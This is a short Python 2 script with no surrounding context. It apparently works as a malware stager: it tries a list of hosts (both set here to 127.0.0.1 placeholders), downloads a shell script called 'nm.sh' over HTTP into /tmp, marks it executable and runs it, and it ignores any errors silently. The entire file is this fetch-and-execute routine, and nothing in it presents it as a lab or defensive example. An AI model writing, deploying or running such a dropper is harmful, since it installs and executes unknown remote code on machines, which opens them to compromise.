#!/usr/bin/python
import urllib2, os

urls = ["127.0.0.1","127.0.0.1"]
port = "80"
payload = "nm.sh"

for url in urls:
	u = "http://%s:%s/%s" % (url, port, payload)
	try:
		r = urllib2.urlopen(u)
		wfile = open("/tmp/nm.sh","wb")
		wfile.write(r.read())
		wfile.close()
		break
	except: continue

if os.path.exists("/tmp/nm.sh"):
	os.system("chmod 700 /tmp/nm.sh")
	os.system("/tmp/nm.sh")
		
